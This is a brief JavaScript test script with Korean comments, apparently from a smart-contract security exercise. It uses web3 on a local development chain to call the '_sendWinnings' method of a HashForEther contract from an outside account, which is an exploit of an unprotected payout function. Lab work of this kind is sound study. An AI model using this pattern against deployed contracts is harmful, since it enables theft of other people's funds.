//생성한 Contract의 기능 및 함수 호출 등을 테스팅하는 곳
//Contract의 주소 값만 변경해주면 됨
//원하는 코드를 작성해서 함수 호출 등을 테스트
const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://127.0.0.1:9545"));
const test_json = require("../build/contracts/HashForEther.json");

const a = test_json["abi"];
const bytecode = test_json["bytecode"];

async function attack(){
    //contract address를 등록 = attack로
    const attack = new web3.eth.Contract(a, "0x5C9bB80BAf26226275F1d752a59AFb3fed5452b6");
    const account_list = await web3.eth.getAccounts();
    const account0_balance = await web3.eth.getBalance("0x50a3c7460b3bd111B4330ac90f8410c7085298b7");
    console.log(account_list);

    console.log("accounts[0] =",account0_balance);
    
    //attack.methods.myMethod([param1[, param2[, ...]]])
    /*await attack.methods.withdrawWinnings().send({from: account0_balance, gas:100000, gasPrice:'200000' }).then(
        function(result){
            console.log(result);
        }
    );*/

   
}
    //call = 지정한 함수를 호출
    //attack.methods.myMethod([param1[, param2[, ...]]]).call(options [, defaultBlock] [, callback])
async function attack_send(){
    const attack_send = new web3.eth.Contract(a, "0x5C9bB80BAf26226275F1d752a59AFb3fed5452b6");
    const account_list = await web3.eth.getAccounts();
    
    await attack_send.methods._sendWinnings().send({from: "0x888775d42Eff5d828eFCB581C487AE2fB46f2045", gas:100000,gasPrice:'200000'}).then(
        function(res){
            console.log(res);
        }
    );
}   
         
/*deployed.deploy(greet);
greet.deployed().then(function(a){
    getgreet = a;
})
const b = getgreet.getGreeting();
console.log(b);*/
//함수를 실행하는 부분
attack();
attack_send();
//attack.methods.myMethod([param1[, param2[, ...]]])
//methods는 call, send, estimateGas, encodeABI만 가능